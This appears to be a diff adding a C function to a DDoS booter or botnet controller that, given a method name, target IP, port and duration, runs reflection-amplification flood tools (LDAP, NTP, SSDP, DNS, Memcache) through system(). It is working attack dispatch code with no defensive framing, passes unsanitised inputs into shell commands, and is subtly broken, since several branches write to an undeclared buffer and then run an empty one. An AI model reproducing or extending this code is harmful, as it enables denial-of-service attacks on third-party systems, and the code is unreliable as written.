@@ -1,0 +1,38 @@
+void Vex(char *method, char *ip, char *port, char *time) {
+    if(!strcmp(method, "LDAPV2"))
+    {
+        char yeet[128];
+        snprintf(yeet, sizeof(yeet), "cd; cd IPHM; ./ldapv2 %s %s ldap.txt 1 -1 %s", ip, port, time);
+        system(yeet);
+    }
+    if(!strcmp(method, "LDAP"))
+    {
+        char yeet[128];
+        snprintf(space, sizeof(yeet), "./ldap %s %s ldap.txt 1 -1 %s", ip, port, time);
+        system(yeet);
+    }
+    if(!strcmp(method, "NTP"))
+    {
+        char yeet[128];
+        snprintf(space, sizeof(yeet), "cd; cd IPHM; ./ntp %s %s ntp.txt 1 -1 %s", ip, port, time);
+        system(yeet);
+    }
+    if(!strcmp(method, "SSDP"))
+    {
+        char yeet[128];
+        snprintf(space, sizeof(yeet), "cd; cd IPHM; ./ssdp %s %s ssdp.txt 1 -1 %s", ip, port, time);
+        system(yeet);
+    }
+    if(!strcmp(method, "DNS"))
+    {
+        char yeet[128];
+        snprintf(yeet, sizeof(yeet), "cd; cd IPHM; ./dns %s %s dns.txt 1 -1 %s", ip, port, time);
+        system(yeet);
+    }
+    if(!strcmp(method, "MEMCACHE"))
+    {
+        char yeet[128];
+        snprintf(yeet, sizeof(yeet), "cd; cd IPHM; ./memcache %s %s memcache.txt 1 -1 %s", ip, port, time);
+        system(yeet);
+    }
+}
